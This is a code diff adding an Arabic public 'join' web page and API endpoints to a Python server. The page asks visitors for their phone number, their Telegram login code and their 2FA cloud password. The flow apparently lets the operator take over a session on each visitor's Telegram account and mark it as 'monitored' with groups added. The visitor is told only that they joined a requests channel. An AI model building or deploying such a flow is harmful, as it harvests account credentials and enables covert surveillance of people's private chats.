+      .catch(function () { msg("m2", "تعذر الاتصال — تحقق من الإنترنت وحاول.", false); })
+      .then(function () { st.busy = false; busyBtn($("bStart"), false); });
+  });
+
+  // الخطوة 3 → verify
+  $("code").addEventListener("input", function () {
+    this.value = this.value.replace(/[^0-9]/g, "");
+    clr("m3");
+  });
+  $("code").addEventListener("keydown", function (e) { if (e.key === "Enter") $("bVerify").click(); });
+  $("back2").addEventListener("click", function () { show("s2"); $("bStart").disabled = false; });
+  $("bVerify").addEventListener("click", function () {
+    if (st.busy) return;
+    var code = $("code").value.replace(/[^0-9]/g, "");
+    if (code.length < 4) { msg("m3", "أدخل الكود كاملًا.", false); return; }
+    st.busy = true; clr("m3");
+    busyBtn($("bVerify"), true, "جارٍ التحقق");
+    post("/api/join/verify", { phone: st.phone, code: code })
+      .then(function (d) {
+        if (d.status === "joined") { finish(d); return; }
+        if (d.status === "need_password") { show("s3p"); setTimeout(function () { $("pw").focus(); }, 60); return; }
+        handleErr("m3", d);
+      })
+      .catch(function () { msg("m3", "تعذر الاتصال — تحقق من الإنترنت وحاول.", false); })
+      .then(function () { st.busy = false; busyBtn($("bVerify"), false); });
+  });
+
+  // 3ب: كلمة السر
+  $("pw").addEventListener("keydown", function (e) { if (e.key === "Enter") $("bPw").click(); });
+  $("bPw").addEventListener("click", function () {
+    if (st.busy) return;
+    var pw = $("pw").value;
+    if (!pw) { msg("m3p", "أدخل كلمة السر.", false); return; }
+    st.busy = true; clr("m3p");
+    busyBtn($("bPw"), true, "جارٍ التحقق");
+    post("/api/join/verify", { phone: st.phone, password: pw })
+      .then(function (d) {
+        if (d.status === "joined") { finish(d); return; }
+        handleErr("m3p", d);
+      })
+      .catch(function () { msg("m3p", "تعذر الاتصال — حاول مجددًا.", false); })
+      .then(function () { st.busy = false; busyBtn($("bPw"), false); });
+  });
+
+  function finish(d) {
+    $("okName").textContent = (d.name ? ("مرحبًا " + d.name + "! ") : "") +
+      "تم انضمامك لقناة الطلبات بنجاح.";
+    $("okHow").textContent = d.instant ? "مراقَب — انضمام فوري" : "مراقب جديد بالكود";
+    $("okGroups").textContent = (d.groups_added || 0);
+    $("okGroupsRow").style.display = d.instant ? "none" : "flex";
+    var link = d.channel_link || "";
+    if (link) { $("openCh").href = link; $("openCh").style.display = "block"; }
+    else { $("openCh").style.display = "none"; }
+    show("s4");
+    window.scrollTo(0, 0);
+  }
+})();
+</script>
+</body>
+</html>"""
+
+
+def _client_ip(request) -> str:
+    """آيبي الطالب (خلف Render proxy) — لأغراض حدود المعدل فقط."""
+    fwd = request.headers.get('X-Forwarded-For', '')
+    if fwd:
+        return fwd.split(',')[0].strip()
+    return request.remote or ''
+
+
+async def join_page_handler(request):
+    """[JOIN-WEB] صفحة معالج الانضمام العام (عربية RTL — من الجوال)."""
+    return web.Response(text=_JOIN_PAGE_HTML, content_type="text/html",
+                        charset="utf-8")
+
+
+async def api_join_start_handler(request):
+    """[JOIN-WEB] POST {phone} → انضمام فوري أو إرسال كود تيليجرام."""
+    monitor = request.app.get("monitor")
+    mgr = getattr(monitor, 'web_join', None) if monitor else None
+    if mgr is None:
+        return web.json_response(
+            {"ok": False, "status": "error", "error": "not ready"},
+            status=503, headers={"Access-Control-Allow-Origin": "*"})
+    try:
+        body = await request.json()
+    except Exception:
+        return web.json_response(
+            {"ok": False, "status": "bad_request"},
+            status=400, headers={"Access-Control-Allow-Origin": "*"})
+    phone = str((body or {}).get("phone") or "")
+    res = await mgr.start_join(phone, _client_ip(request))
+    return web.json_response(res,
+                             headers={"Access-Control-Allow-Origin": "*"})
+
+
+async def api_join_verify_handler(request):
+    """[JOIN-WEB] POST {phone, code, password?} → إكمال الانضمام."""
+    monitor = request.app.get("monitor")
+    mgr = getattr(monitor, 'web_join', None) if monitor else None
+    if mgr is None:
+        return web.json_response(
+            {"ok": False, "status": "error", "error": "not ready"},
+            status=503, headers={"Access-Control-Allow-Origin": "*"})
+    try:
+        body = await request.json()
+    except Exception:
+        return web.json_response(
+            {"ok": False, "status": "bad_request"},
+            status=400, headers={"Access-Control-Allow-Origin": "*"})
+    b = body or {}
+    res = await mgr.verify_join(str(b.get("phone") or ""),
+                                str(b.get("code") or ""),
+                                str(b.get("password") or ""))
+    return web.json_response(res,
+                             headers={"Access-Control-Allow-Origin": "*"})
+
+
+async def api_join_status_handler(request):
+    """[JOIN-WEB] إحصاءات الانضمام — للوحة المُشغّل."""
+    monitor = request.app.get("monitor")
+    mgr = getattr(monitor, 'web_join', None) if monitor else None
+    if mgr is None:
+        return web.json_response(
+            {"ok": False, "error": "not ready"},
+            status=503, headers={"Access-Control-Allow-Origin": "*"})
+    snap = mgr.stats_snapshot()
+    snap['ok'] = True
+    return web.json_response(snap,
+                             headers={"Access-Control-Allow-Origin": "*"})
+
+
 async def start_http_server(monitor=None, db=None):
     port = int(os.getenv("PORT", "10000"))
     app = web.Application()
@@ -19187,6 +20050,11 @@ async def start_http_server(monitor=None, db=None):
     app.router.add_get("/api/monitored_chats", api_monitored_chats_handler)  # monitored chats + AI
     app.router.add_get("/api/link_source_check", api_link_source_check_handler)  # check if source is monitored
     app.router.add_get("/api/polling_status", api_polling_status_handler)  # active polling status
+    # [JOIN-WEB v4.4.22] الانضمام العام: الصفحة + نقاط النهاية + الإحصاءات
+    app.router.add_get("/join", join_page_handler)
+    app.router.add_post("/api/join/start", api_join_start_handler)
+    app.router.add_post("/api/join/verify", api_join_verify_handler)
+    app.router.add_get("/api/join_status", api_join_status_handler)
     # [DELETED-LINKS] admin-moderated deleted links CRUD
     app.router.add_get("/api/deleted_links", api_deleted_links_handler)
     app.router.add_post("/api/deleted_links", api_deleted_links_handler)  # method-dispatch
